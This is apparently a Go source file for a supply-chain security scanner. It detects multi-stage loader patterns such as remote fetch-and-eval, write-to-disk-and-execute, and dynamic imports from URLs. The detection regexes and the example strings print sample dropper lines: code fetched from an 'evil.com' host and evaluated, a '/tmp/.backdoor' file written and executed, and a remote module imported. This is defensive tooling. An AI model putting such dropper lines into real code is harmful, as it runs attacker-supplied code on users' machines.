package analyzer

import (
	"fmt"
	"regexp"
	"strings"
)

// MultiStageLoaderAnalyzer detects multi-stage payload delivery patterns
// where code downloads and executes additional payloads from remote servers.
// Based on Wiz/Cycode research on 12-stage npm droppers and cascading loaders.
type MultiStageLoaderAnalyzer struct{}

func NewMultiStageLoaderAnalyzer() *MultiStageLoaderAnalyzer {
	return &MultiStageLoaderAnalyzer{}
}

func (a *MultiStageLoaderAnalyzer) Name() string {
	return "multistage-loader"
}

var (
	// Network fetch patterns
	networkFetchPattern = regexp.MustCompile(`(?i)fetch\s*\(\s*['"]https?://|https?\.\s*get\s*\(\s*['"]|http\.\s*get\s*\(\s*['"]|axios\.\s*get\s*\(|request\s*\(\s*['"]https?://`)

	// Dynamic execution after network
	dynamicExecPattern = regexp.MustCompile(`(?i)eval\s*\(|new\s+Function\s*\(|exec\s*\(|execSync\s*\(|spawn\s*\(`)

	// File write then execute pattern
	fileWritePattern = regexp.MustCompile(`(?i)writeFileSync\s*\(|writeFile\s*\(|createWriteStream\s*\(`)

	// Dynamic import() with variable/URL
	dynamicImportPattern = regexp.MustCompile(`import\s*\(\s*(?:[a-zA-Z_$]\w*|['"]https?://)`)

	// chmod + execute
	chmodExecPattern = regexp.MustCompile(`(?i)chmod\s+\+x|chmod\s+755|chmod\s+777`)
)

func (a *MultiStageLoaderAnalyzer) scanContent(content string, filename string) []Finding {
	var findings []Finding

	hasNetworkFetch := networkFetchPattern.MatchString(content)
	hasDynamicExec := dynamicExecPattern.MatchString(content)
	hasFileWrite := fileWritePattern.MatchString(content)
	hasDynamicImport := dynamicImportPattern.MatchString(content)
	hasChmodExec := chmodExecPattern.MatchString(content)

	// Stage 1: Fetch from network + eval/exec (classic dropper)
	if hasNetworkFetch && hasDynamicExec {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Multi-stage loader: remote fetch and execute",
			Description: fmt.Sprintf("File %q fetches remote content and executes it dynamically. This is a classic multi-stage dropper that downloads payloads from command-and-control servers.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "Multi-stage dropper:\n" +
				"    const code = await fetch('https://evil.com/stage2.js').then(r => r.text());\n" +
				"    eval(code); // Stage 2 downloads stage 3...\n" +
				"    Each stage can evade static analysis by loading dynamically.",
			Remediation: "This is a remote code execution dropper. Investigate the URL and remove the package.",
		})
	}

	// File-drop-and-execute
	if hasFileWrite && (hasDynamicExec || hasChmodExec) {
		findings = append(findings, Finding{
			Analyzer:    a.Name(),
			Title:       "Dropper: write-to-disk and execute",
			Description: fmt.Sprintf("File %q writes data to disk and then executes it. This is a file-dropping technique that installs persistent backdoors.", filename),
			Severity:    SeverityCritical,
			ExploitExample: "File dropper:\n" +
				"    fs.writeFileSync('/tmp/.backdoor', payload);\n" +
				"    execSync('chmod +x /tmp/.backdoor && /tmp/.backdoor');\n" +
				"    Writes binary to temp location and executes.",
			Remediation: "Investigate what is being written to disk and executed. Check for base64-encoded payloads.",
		})
	}

	// Dynamic import() from URL (ESM loader)
	if hasDynamicImport {
		// Check if the import uses a URL or variable (not a static string path)
		if strings.Contains(content, "import(url") || strings.Contains(content, "import(endpoint") ||
			strings.Contains(content, "import('http") || strings.Contains(content, `import("http`) {
			findings = append(findings, Finding{
				Analyzer:    a.Name(),
				Title:       "Dynamic import from remote URL",
				Description: fmt.Sprintf("File %q uses dynamic import() with a URL or variable. This loads and executes remote ESM modules at runtime.", filename),
				Severity:    SeverityHigh,
				ExploitExample: "Remote ESM loader:\n" +
					"    const mod = await import('https://cdn.evil.com/module.mjs');\n" +
					"    mod.default(); // Execute remote code\n" +
					"    Dynamic imports bypass static analysis of dependencies.",
				Remediation: "Verify the import source. Dynamic imports from URLs can load arbitrary code.",
			})
		}
	}

	return findings
}
